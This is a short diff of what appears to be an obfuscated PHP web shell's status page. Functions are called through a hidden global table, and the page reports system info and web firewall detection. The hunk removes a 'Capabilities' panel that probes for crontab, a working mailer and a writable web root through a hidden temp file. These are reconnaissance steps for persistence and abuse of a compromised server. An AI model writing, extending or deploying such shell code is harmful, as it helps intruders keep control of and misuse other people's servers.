@@ -1414,21 +1414,6 @@ $uname = $GLOBALS['_q_'][20]('php_uname') ? php_uname() : 'N/A';
                     <p class="flex justify-between"><span class="text-gray-500">WAF:</span> <span class="<?= $wafColor ?> font-bold"><?= $wafDetected ?></span></p>
                 </div>
             </div>
-            
-            <div class="bg-gray-900 p-3 rounded border border-gray-700">
-                <p class="text-orange-400 font-bold mb-2 border-b border-gray-800 pb-1 uppercase">Capabilities</p>
-                <div class="space-y-1">
-                    <?php
-                    $cron = (bool)$GLOBALS['_q_'][21]("which crontab");
-                    $mail = function_exists('mail') && strpos(ini_get('sendmail_path'), 'sendmail') !== false;
-                    $testFile = $_SERVER['DOCUMENT_ROOT'] . '/.3wgf_tmp';
-                    $immutable = !@file_put_contents($testFile, '1'); @unlink($testFile);
-                    ?>
-                    <p class="flex justify-between"><span class="text-gray-500">Crontab:</span> <span class="<?= $cron?'text-green-400':'text-red-500' ?>"><?= $cron?'YES':'NO' ?></span></p>
-                    <p class="flex justify-between"><span class="text-gray-500">Mailer:</span> <span class="<?= $mail?'text-green-400':'text-red-500' ?>"><?= $mail?'YES':'NO' ?></span></p>
-                    <p class="flex justify-between"><span class="text-gray-500">Immutable:</span> <span class="<?= $immutable?'text-red-500':'text-green-400' ?>"><?= $immutable?'YES':'NO' ?></span></p>
-                </div>
-            </div>
 
             <div class="bg-gray-900 p-3 rounded border border-gray-700">
                 <p class="text-green-400 font-bold mb-2 border-b border-gray-800 pb-1 uppercase">PHP Configuration</p>
